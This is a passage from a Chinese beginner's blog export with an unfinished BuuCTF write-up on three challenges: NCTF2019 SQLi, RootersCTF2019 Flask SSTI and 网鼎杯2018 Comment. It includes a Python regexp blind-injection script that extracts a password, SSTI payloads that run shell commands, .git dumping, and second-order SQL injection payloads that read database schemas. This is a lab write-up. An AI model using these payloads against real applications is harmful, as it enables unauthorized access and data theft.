class="hljs-number">2522</span>scm%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">252220140713</span>.<span class="hljs-number">130102334</span>..%<span class="hljs-number">2522</span>%<span class="hljs-number">257</span>D&amp;request_id=<span class="hljs-number">170149064516800213084111</span>&amp;biz_id=<span class="hljs-number">0</span>&amp;utm_medium=distribute.pc_search_result.none-task-blog-<span class="hljs-number">2</span>~<span class="hljs-literal">all</span>~top_positive~default-<span class="hljs-number">1</span>-<span class="hljs-number">107621010</span>-null-null.<span class="hljs-number">142</span>^v96^pc_search_result_base9&amp;utm_term=mocas_wang&amp;spm=<span class="hljs-number">1018</span>.<span class="hljs-number">2226</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">4187</span><br><span class="hljs-attribute">https</span>://blog.csdn.net/qq_62414755/article/details/<span class="hljs-number">125886742</span>?ops_request_misc=%<span class="hljs-number">257</span>B%<span class="hljs-number">2522</span>request%<span class="hljs-number">255</span>Fid%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522170149059516800188587075</span>%<span class="hljs-number">2522</span>%<span class="hljs-number">252</span>C%<span class="hljs-number">2522</span>scm%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">252220140713</span>.<span class="hljs-number">130102334</span>..%<span class="hljs-number">2522</span>%<span class="hljs-number">257</span>D&amp;request_id=<span class="hljs-number">170149059516800188587075</span>&amp;biz_id=<span class="hljs-number">0</span>&amp;utm_medium=distribute.pc_search_result.none-task-blog-<span class="hljs-number">2</span>~<span class="hljs-literal">all</span>~top_click~default-<span class="hljs-number">2</span>-<span class="hljs-number">125886742</span>-null-null.<span class="hljs-number">142</span>^v96^pc_search_result_base9&amp;utm_term=java%E5%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>D%E5%BA%<span class="hljs-number">8</span>F%E5%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%E5%<span class="hljs-number">8</span>C%<span class="hljs-number">96</span>&amp;spm=<span class="hljs-number">1018</span>.<span class="hljs-number">2226</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">4187</span><br><span class="hljs-attribute">https</span>://blog.csdn.net/mochu7777777/article/details/<span class="hljs-number">130221488</span>?ops_request_misc=%<span class="hljs-number">257</span>B%<span class="hljs-number">2522</span>request%<span class="hljs-number">255</span>Fid%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">2522170149059516800188587075</span>%<span class="hljs-number">2522</span>%<span class="hljs-number">252</span>C%<span class="hljs-number">2522</span>scm%<span class="hljs-number">2522</span>%<span class="hljs-number">253</span>A%<span class="hljs-number">252220140713</span>.<span class="hljs-number">130102334</span>..%<span class="hljs-number">2522</span>%<span class="hljs-number">257</span>D&amp;request_id=<span class="hljs-number">170149059516800188587075</span>&amp;biz_id=<span class="hljs-number">0</span>&amp;utm_medium=distribute.pc_search_result.none-task-blog-<span class="hljs-number">2</span>~<span class="hljs-literal">all</span>~top_positive~default-<span class="hljs-number">1</span>-<span class="hljs-number">130221488</span>-null-null.<span class="hljs-number">142</span>^v96^pc_search_result_base9&amp;utm_term=java%E5%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>D%E5%BA%<span class="hljs-number">8</span>F%E5%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%E5%<span class="hljs-number">8</span>C%<span class="hljs-number">96</span>&amp;spm=<span class="hljs-number">1018</span>.<span class="hljs-number">2226</span>.<span class="hljs-number">3001</span>.<span class="hljs-number">4187</span><br><span class="hljs-attribute">https</span>://dyfloveslife.github.io/<span class="hljs-number">2020</span>/<span class="hljs-number">03</span>/<span class="hljs-number">21</span>/Serialization-and-Deserialization-in-Java/<br><span class="hljs-attribute">https</span>://websec.readthedocs.io/zh/latest/language/java/unserialize.html<br><span class="hljs-attribute">https</span>://xilitter.github.io/<span class="hljs-number">2023</span>/<span class="hljs-number">02</span>/<span class="hljs-number">23</span>/java%E5%<span class="hljs-number">8</span>F%<span class="hljs-number">8</span>D%E5%BA%<span class="hljs-number">8</span>F%E5%<span class="hljs-number">88</span>%<span class="hljs-number">97</span>%E5%<span class="hljs-number">8</span>C%<span class="hljs-number">96</span>%E5%<span class="hljs-number">9</span>F%BA%E7%A1%<span class="hljs-number">80</span>/<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>(未写完)BuuCTF做题记录_6</title>
    <link href="/2023/11/29/-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_6/"/>
    <url>/2023/11/29/-BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_6/</url>
    
    <content type="html"><![CDATA[<p>初学者的一些做题记录</p><span id="more"></span><hr><h2 id="NCTF2019-SQLi"><a href="#NCTF2019-SQLi" class="headerlink" title="[NCTF2019]SQLi"></a>[NCTF2019]SQLi</h2><p><img src="/img/nctf2015sqli1.png" alt="nctf2015sqli1"></p><p><img src="/img/nctf2019sqli2.png" alt="nctf2019sqli2"></p><p><code>robots.txt</code>下提示<code>hint.txt</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$black_list</span> = <span class="hljs-string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\&#x27;|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;<br><br><br>If <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>] === admin<span class="hljs-string">&#x27;s password,</span><br><span class="hljs-string"></span><br><span class="hljs-string">Then you will get the flag;</span><br></code></pre></td></tr></table></figure><p>查询语句：</p><p><code>sqlquery : select * from users where username=&#39;&#39; and passwd=&#39;&#39;</code></p><p>一开始想用<code>\</code>去转义<code>username</code>的单引号然后用万能密码登录：</p><p><code>\</code>和<code>||1</code>，查询语句会变成：</p><p><code>select * from users where username=&#39;\&#39; and passwd=&#39;||1&#39;</code>,此时用户名就是<code>&#39; and passwd=</code>，后面连一个<code>||1</code>。但不知道后面那个单引号要怎么闭合(注释符被屏蔽掉了)</p><p>看了wp发现还可以用<code>;</code>和<code>%00</code>拼接实现截断：</p><blockquote><p>php &lt; 5.3.4, 且 magic_quotes_gpc &#x3D; Off 时可进行 <code>%00</code> 截断</p></blockquote><p>这里我理解的就是利用<code>;</code>终止了<code>passwd</code>部分的输入，然后再用<code>%00</code>截断后面的单引号</p><p><code>username=123%5C&amp;passwd=||1;%00</code>:</p><p><img src="/img/nctfsqli1.png" alt="nctfsqli1"></p><p>重定向到了<code>welcome.php</code>，但实际这东西没法访问。。</p><p><img src="/img/nctfsqli20193.png" alt="nctfsqli20193"></p><p><code>regexp</code>注入：<code>正则注入</code>(参考：<code>https://blog.csdn.net/l2872253606/article/details/125265138</code>)</p><p>比如匹配<code>e</code>开头的：</p><p><img src="/img/nctf2019sqli4.png" alt="nctf2019sqli4"></p><p>再看看<code>a</code>开头的：</p><p><img src="/img/nctf2019sqli5.png" alt="nctf2019sqli5"></p><p>所以我们可以这么判断：</p><p><code>username=123%5C&amp;passwd=||/**/passwd/**/regexp/**/&quot;^y&quot;;%00</code></p><p><img src="/img/nctf2019sqli6.png" alt="nctf2019sqli6"></p><p><code>username=123%5C&amp;passwd=||/**/passwd/**/regexp/**/&quot;^a&quot;;%00</code></p><p><img src="/img/nctf2019sqli7.png" alt="nctf2019sqli7"></p><p>注意两个页面的不同，其实这么搞就有点像盲注了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">from</span> urllib <span class="hljs-keyword">import</span> parse<br><br>url = <span class="hljs-string">&quot;http://662edc83-8269-4f75-93e8-01b69e9c73a2.node4.buuoj.cn:81/&quot;</span><br>pw_fuzz = string.ascii_lowercase + string.digits + <span class="hljs-string">&quot;_&quot;</span>  <span class="hljs-comment"># 密码字典：小写字母和数字还有下划线</span><br>pw = <span class="hljs-string">&quot;&quot;</span>  <span class="hljs-comment"># admin的密码</span><br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> pw_fuzz:<br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>: <span class="hljs-string">&#x27;\\&#x27;</span>,<br>            <span class="hljs-string">&#x27;passwd&#x27;</span>: <span class="hljs-string">&#x27;||/**/passwd/**/regexp/**/&quot;^&#123;&#125;&quot;;&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>((pw+i),parse.unquote(<span class="hljs-string">&#x27;%00&#x27;</span>))<br>        &#125;<br>        res = requests.post(url=url, data=data).text<br>        <span class="hljs-comment">#print(res)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;welcome.php&quot;</span>  <span class="hljs-keyword">in</span> res:<br>            pw = pw + i<br>            <span class="hljs-built_in">print</span>(pw)<br></code></pre></td></tr></table></figure><p>其中<code>\</code>放了两个是因为需要转义，在<code>python</code>中有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;it\&#x27;s my code&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\\&#x27;</span>)<br><span class="hljs-comment">#it&#x27;s my code</span><br><span class="hljs-comment">#\</span><br></code></pre></td></tr></table></figure><p>用<code>parse.unquote(&#39;%00&#39;)</code>为了防止转义<code>%00</code>，比如在登录框直接打<code>%00</code>会被转义成<code>%2500</code>：</p><p><img src="/img/2019nctfsqli9.png" alt="2019nctfsqli9"></p><p>当然也有师傅直接用的<code>\x00</code>截断，结果一样的</p><p><img src="/img/nctf2019sqli8.png" alt="nctf2019sqli8"></p><p>you_will_never_know7788990</p><p>然后直接登录就行</p><h2 id="RootersCTF2019-I"><a href="#RootersCTF2019-I" class="headerlink" title="[RootersCTF2019]I_&lt;3_Flask"></a>[RootersCTF2019]I_&lt;3_Flask</h2><p><img src="/img/iluvflask1.png" alt="iluvflask1"></p><p>提示<code>FLASK</code>，猜测<code>SSTI</code>,但找不到注入点。。</p><p>这里要用<code>Arjun</code>这个东西把参数扫出来：</p><p><code>arjun -u http://c7d87961-7455-4eaa-8952-5d8c62ab0907.node4.buuoj.cn:81/ -c 100 -d 5 </code></p><p><img src="/img/iluvflask5.png" alt="iluvflask5"></p><p>后面就是简单的<code>ssti</code>了而且没啥过滤，就不详细写了</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> </span><br><span class="language-xml"></span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat flag.txt&#x27;</span>).read()&#125;&#125;</span><span class="language-xml"> </span><br></code></pre></td></tr></table></figure><p><img src="/img/iluvflask3.png" alt="iluvflask3"></p><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p><img src="/img/wdb2018comment1.png" alt="wdb2018comment1"></p><p>没找到啥提示，<code>dirsearch</code>能扫出<code>.git</code>文件，直接访问发现<code>Forbidden</code></p><p><code>dirsearch -u http://27a5f1ac-984c-46a1-9c73-0fc68067d28c.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p><img src="/img/wdb2018comment3.png" alt="wdb2018comment3"></p><p><code>Githack</code>弄它：</p><p><code>python Githack.py -u http://dd49341c-8374-4a4a-91ac-b258826c8af5.node4.buuoj.cn:81/.git/</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write_do.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>到这里不会做了。。我一开始以为<code>$_SESSION[&#39;login&#39;]</code>这里会有利用点，但是很明显这代码也没干啥事？后面看了<code>wp</code>才知道这东西不全。。</p><p><code>Kali</code>下：</p><p><code>python2 GitHack.py http://27a5f1ac-984c-46a1-9c73-0fc68067d28c.node4.buuoj.cn:81/.git</code></p><p>然后进对应文件夹看所有分支提交历史：</p><p><img src="/img/wdb2018comment4.png" alt="wdb2018comment4"></p><p><code>git reset --hard  e5b2a2443c2b6d395d06960123142bc91123148c</code></p><p><img src="/img/wdb2018comment5.png" alt="wdb2018comment5"></p><p>再看<code>write_do.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>这个地方好像没啥可以利用的地方。。</p><p>没给<code>register</code>界面，不过他提示了用户名和密码的一部分，<code>zhangwei``zhangwei***</code>，后面三位抓包爆破就行：<code>zhangwei666</code></p><p>注意这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>   <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>   <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>   <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>只做了单纯的转义处理，很容易知道这里可能存在二次注入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br><span class="hljs-comment">//comment</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>   <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><p><code>$category</code>可以当注入点，抓包看下数据怎么传过去的：</p><p><img src="/img/wdb2018comment6.png" alt="wdb2018comment6"></p><p>CATEGORY字段：<code>test&#39;,content=database()#</code></p><p>这东西放进去就相当于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;test\&#x27;,content=database()#&#x27;,</span><br><span class="hljs-string">                title = &#x27;2&#x27;,</span><br><span class="hljs-string">                content = &#x27;222&#x27;&quot;</span>;<br><span class="hljs-comment">//comment</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>   <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;test&#x27;,content=database()#&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><br><br></code></pre></td></tr></table></figure><p>然后在<code>comment</code>下触发就行。</p><p>但奇怪的是我的<code>payload</code>并没有触发，<code>comment</code>提交后加载不出来。。</p><p>后面才知道对于这种多行的<code>sql</code>语句要用多行注释<code>(\**\)</code>。。</p><p>我当时理解的是:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> comment<br>            <span class="hljs-keyword">set</span> category = <span class="hljs-string">&#x27;&#x27;</span>,content=<span class="hljs-keyword">database</span>()#<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                content = &#x27;</span>$content<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;</span>$bo_id<span class="hljs-string">&#x27;&quot;;</span><br></code></pre></td></tr></table></figure><p><code>database()#</code>里的这个<code>#</code>把后面所有内容全注释掉了，所以随便哪个<code>bo_id</code>中对应的内容都回显库名。</p><p>对于多行<code>sql</code>，举个栗子：</p><p><img src="/img/wdb2018comment7.png" alt="wdb2018comment7"></p><p>CATEGORY字段：<code>1&#39;,content=database(),/*</code></p><p>然后再<code>comment</code>时<code>content</code>字段改成：<code>*/#</code>，这样组合相当于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">        set category = &#x27;1&#x27;,content=database(),/*&#x27;,</span><br><span class="hljs-string">            content = &#x27;*/#&#x27;,</span><br><span class="hljs-string">            bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>第二行的<code>/*</code>与第三行的<code>*/</code>将中间注释，而第三行的<code>#</code>，将后面的<code>单引号</code>和<code>逗号</code>给注释了。</p><p><img src="/img/wdb2018comment9.png" alt="wdb2018comment9"></p><p>爆库：<code>test&#39;,content=(select(group_concat(schema_name))from(information_schema.schemata)),/*</code></p><p>爆表：<code>test&#39;,content=(select(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),/*</code></p><p><img src="/img/wdb2018comment16.png" alt="wdb2018comment16"></p><p>爆字段的时候会发现没有和<code>flag</code>有关的字段，看了<code>wp</code>发现这里要去看<code>user</code>这个东西：</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">1&#x27;,content</span>=<span class="hljs-string">user(),/*   //返回当前数据库连接的用户名</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment10.png" 